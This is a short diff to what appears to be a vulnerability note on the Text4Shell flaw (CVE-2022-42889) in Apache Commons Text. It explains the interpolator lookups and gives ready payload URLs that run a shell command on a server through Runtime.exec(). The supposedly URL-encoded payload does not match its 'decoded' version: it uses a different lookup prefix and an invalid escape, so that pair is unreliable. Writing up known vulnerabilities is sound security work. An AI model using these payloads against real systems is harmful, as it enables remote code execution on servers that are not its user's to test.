@@ -25,7 +25,7 @@
 - The vulnerability exists in the StringSubstitutor interpolator object. An interpolator is created by the StringSubstitutor.createInterpolator() method and will allow for string lookups as defined in the StringLookupFactory. This can be used by passing a string “${prefix:name}” where the prefix is the aforementioned lookup. Using the “script”, “dns”, or “url” lookups would allow a crafted string to execute arbitrary scripts when passed to the interpolator object.
 - This issue affects Apache Commons Text versions 1.5 through 1.9.
 - Cmd Injection URL Payload - ```https://your-target.com/exploit?search=%24%7Burl%3AUTF-8%3Ajava.lang.Runtime.getRuntime%28%29.exec%28%27touch+%2Ttmp%2Fhelloworld%27%29%7d ```
-- Actual payload after decode - ```https://your-target.com/exploit?search=${script:javascript:java.lang.Runtime.getRuntime().exec('touch helloworld')}
+- Actual payload after decode - ```https://your-target.com/exploit?search=${script:javascript:java.lang.Runtime.getRuntime().exec('touch helloworld')} ```
 - After successful execution a file helloworld will be created in app server.
 - References: https://github.com/devenes/text4shell-cve-2022-42889
 </details>
